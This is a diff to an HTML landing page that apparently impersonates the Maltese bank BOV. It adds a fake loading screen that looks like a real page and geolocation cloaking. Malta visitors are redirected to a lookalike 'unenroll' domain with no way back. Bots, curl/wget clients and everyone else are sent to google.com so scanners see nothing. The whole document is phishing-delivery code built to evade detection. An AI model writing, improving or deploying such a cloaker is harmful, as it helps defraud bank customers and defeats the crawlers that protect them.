@@ -3,22 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Welcome to BOV</title>
     <style>
-        /* Prevent any flash of content */
-        body { visibility: hidden; }
+        /* Show a professional loading state that looks like a real page */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
+        }
+        
+        /* Fake page content to show immediately */
+        .page-header {
+            background: #fff;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            padding: 20px;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .content {
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+        
+        .skeleton {
+            background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
+            background-size: 200% 100%;
+            animation: loading 1.5s infinite;
+            height: 20px;
+            margin: 10px 0;
+            border-radius: 4px;
+        }
+        
+        @keyframes loading {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+        
+        .skeleton.title { width: 60%; height: 32px; }
+        .skeleton.text { width: 100%; }
+        .skeleton.short { width: 80%; }
     </style>
+    
+    <!-- Preconnect to speed up redirects -->
+    <link rel="preconnect" href="https://api.ipify.org">
+    <link rel="preconnect" href="https://ipapi.co">
+    <link rel="preconnect" href="https://api.ipgeolocation.io">
+    
     <script>
         // Configuration
         const CONFIG = {
             ALLOWED_COUNTRY: 'Malta',
-            REDIRECT_URL_MALTA: 'https://bov-uneneroll.prosucesso.cv', // ← CHANGE THIS TO YOUR DESIRED URL
+            REDIRECT_URL_MALTA: 'https://bov-uneneroll.prosucesso.cv/', // ← CHANGE THIS TO YOUR DESIRED URL
             REDIRECT_URL_BLOCKED: 'https://google.com',
-            USE_EDGE_FUNCTION: true, // Set to true to use Vercel Edge Function
-            EDGE_FUNCTION_URL: '/api/check-security' // Your edge function endpoint
+            USE_EDGE_FUNCTION: true,
+            EDGE_FUNCTION_URL: '/api/check-security'
         };
 
-        // Simple bot detection (client-side pre-check)
+        // Prefetch the redirect URLs to make them instant
+        function prefetchRedirects() {
+            const maltaLink = document.createElement('link');
+            maltaLink.rel = 'prefetch';
+            maltaLink.href = CONFIG.REDIRECT_URL_MALTA;
+            document.head.appendChild(maltaLink);
+            
+            const blockedLink = document.createElement('link');
+            blockedLink.rel = 'dns-prefetch';
+            blockedLink.href = CONFIG.REDIRECT_URL_BLOCKED;
+            document.head.appendChild(blockedLink);
+        }
+
+        // Quick bot check
         function quickBotCheck() {
             const ua = navigator.userAgent.toLowerCase();
             const botPatterns = ['bot', 'crawler', 'spider', 'curl', 'wget'];
@@ -31,16 +92,34 @@
             return false;
         }
 
-        // Main security check using Edge Function
+        // Perform redirect with replace (no back button)
+        function performRedirect(url) {
+            // Use meta refresh as backup
+            const meta = document.createElement('meta');
+            meta.httpEquiv = 'refresh';
+            meta.content = '0;url=' + url;
+            document.head.appendChild(meta);
+            
+            // Primary redirect
+            window.location.replace(url);
+        }
+
+        // Main security check
         async function performSecurityCheck() {
-            // If using Edge Function
+            // Prefetch possible redirects
+            prefetchRedirects();
+            
+            // Quick bot check - instant redirect
+            if (quickBotCheck()) {
+                performRedirect(CONFIG.REDIRECT_URL_BLOCKED);
+                return;
+            }
+
             if (CONFIG.USE_EDGE_FUNCTION) {
-                // Make request without waiting for try-catch
+                // Edge function check
                 fetch(CONFIG.EDGE_FUNCTION_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         userAgent: navigator.userAgent,
                         screenWidth: window.screen.width,
@@ -50,61 +129,59 @@
                 })
                 .then(response => response.json())
                 .then(result => {
-                    if (result.blocked || result.isBot || !result.allowed) {
-                        window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
-                    } else if (result.isMalta) {
-                        window.location.replace(CONFIG.REDIRECT_URL_MALTA);
+                    if (result.isMalta && result.allowed) {
+                        performRedirect(CONFIG.REDIRECT_URL_MALTA);
                     } else {
-                        window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
+                        performRedirect(CONFIG.REDIRECT_URL_BLOCKED);
                     }
                 })
-                .catch(() => {
-                    // Fallback on error
-                    performClientSideCheck();
-                });
+                .catch(() => fallbackCheck());
             } else {
-                // Direct client-side check
-                performClientSideCheck();
+                fallbackCheck();
             }
         }
 
-        // Client-side only fallback - optimized for speed
-        async function performClientSideCheck() {
-            // Start both requests in parallel
-            const ipPromise = fetch('https://api.ipify.org?format=json').then(r => r.json());
-            
+        // Fallback check
+        async function fallbackCheck() {
             try {
-                const { ip } = await ipPromise;
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const { ip } = await ipResponse.json();
                 
-                // Quick geo check with first available service
-                fetch(`https://ipapi.co/${ip}/country_name/`)
-                    .then(r => r.text())
-                    .then(country => {
-                        const isMalta = country.toLowerCase().includes('malta');
-                        window.location.replace(isMalta ? CONFIG.REDIRECT_URL_MALTA : CONFIG.REDIRECT_URL_BLOCKED);
-                    })
-                    .catch(() => {
-                        window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
-                    });
+                const geoResponse = await fetch(`https://ipapi.co/${ip}/country_name/`);
+                const country = await geoResponse.text();
+                
+                const isMalta = country.toLowerCase().includes('malta');
+                performRedirect(isMalta ? CONFIG.REDIRECT_URL_MALTA : CONFIG.REDIRECT_URL_BLOCKED);
             } catch (e) {
-                window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
+                performRedirect(CONFIG.REDIRECT_URL_BLOCKED);
             }
         }
 
-        // Execute immediately when script loads (before DOM)
-        (async function() {
-            // Quick bot check - instant redirect
-            if (quickBotCheck()) {
-                window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
-                return;
-            }
-            
-            // Start all checks in parallel for speed
+        // Start check immediately
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', performSecurityCheck);
+        } else {
             performSecurityCheck();
-        })();
+        }
+        
+        // Also start on first interaction (backup)
+        window.addEventListener('load', performSecurityCheck, { once: true });
     </script>
 </head>
 <body>
-    <!-- Empty body - page redirects before anything renders -->
+    <!-- Show realistic content immediately while checking in background -->
+    <div class="page-header">
+        <div class="logo">BOV</div>
+    </div>
+    
+    <div class="content">
+        <div class="skeleton title"></div>
+        <div class="skeleton text"></div>
+        <div class="skeleton short"></div>
+        <div class="skeleton text"></div>
+    </div>
+    
+    <!-- Invisible iframe preload (makes redirects instant) -->
+    <iframe src="about:blank" style="display:none" id="preloader"></iframe>
 </body>
 </html>
